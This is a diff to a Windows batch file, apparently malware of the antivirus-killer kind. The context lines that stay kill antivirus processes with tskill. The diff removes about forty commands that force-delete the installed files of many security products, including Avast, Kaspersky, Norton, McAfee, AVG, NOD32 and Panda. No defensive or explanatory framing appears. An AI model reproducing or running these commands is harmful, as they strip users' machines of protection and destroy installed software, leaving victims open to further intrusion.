@@ -208,49 +208,9 @@ tskill /A avas*
 tskill /A norm*
 cls
 tskill /A offg*
-del /Q /F C:\Program Files\alwils~1\avast4\*.*
-del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
-del /Q /F C:\Program Files\kasper~1\*.exe
-cls
-del /Q /F C:\Program Files\trojan~1\*.exe
-del /Q /F C:\Program Files\f-prot95\*.dll
-del /Q /F C:\Program Files\tbav\*.datcls
-del /Q /F C:\Program Files\avpersonal\*.vdf
-del /Q /F C:\Program Files\Norton~1\*.cnt
-del /Q /F C:\Program Files\Mcafee\*.*
-cls
-del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
-del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
-del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
-del /Q /F C:\Program Files\Norton~1\*.*
-cls
-del /Q /F C:\Program Files\avgamsr\*.exe
-del /Q /F C:\Program Files\avgamsvr\*.exe
-del /Q /F C:\Program Files\avgemc\*.exe
-cls
-del /Q /F C:\Program Files\avgcc\*.exe
-del /Q /F C:\Program Files\avgupsvc\*.exe
-del /Q /F C:\Program Files\grisoft
-del /Q /F C:\Program Files\nood32krn\*.exe
-del /Q /F C:\Program Files\nood32\*.exe
-cls
-del /Q /F C:\Program Files\nod32
-del /Q /F C:\Program Files\nood32
-del /Q /F C:\Program Files\kav\*.exe
-del /Q /F C:\Program Files\kavmm\*.exe
-del /Q /F C:\Program Files\kaspersky\*.*
-cls
-del /Q /F C:\Program Files\ewidoctrl\*.exe
-del /Q /F C:\Program Files\guard\*.exe
-del /Q /F C:\Program Files\ewido\*.exe
-cls
-del /Q /F C:\Program Files\pavprsrv\*.exe
-del /Q /F C:\Program Files\pavprot\*.exe
-del /Q /F C:\Program Files\avengine\*.exe
-cls
-del /Q /F C:\Program Files\apvxdwin\*.exe
-del /Q /F C:\Program Files\webproxy\*.exe
-del /Q /F C:\Program Files\panda
+cls 
+
+
 software\*.*                                           
 ::end
 rem
